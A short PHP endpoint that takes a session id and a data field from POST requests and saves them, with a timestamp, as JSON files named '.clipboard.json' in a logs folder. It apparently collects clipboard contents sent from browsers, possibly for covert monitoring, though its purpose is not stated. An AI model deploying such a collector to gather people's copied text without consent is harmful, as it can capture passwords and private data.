<?php
header('Content-Type: text/html');
{
  $raw_sid = isset($_POST['Sid']) ? $_POST['Sid'] : 'unknown';
  $sid = preg_replace('/[^a-zA-Z0-9_\-]/', '', $raw_sid);
  $data = isset($_POST['Data']) ? $_POST['Data'] : '';
  $timestamp = date('Y-m-d H:i:s');

  $entry = array(
    'data' => $data,
    'timestamp' => $timestamp,
    'sid' => $sid
  );

  $json_data = json_encode($entry);
  $f = fopen('../../logs/' . $sid . '.' . round(microtime(true) * 1000) . '.clipboard.json', 'w+');
  fwrite($f, $json_data);
  fclose($f);
}
?>
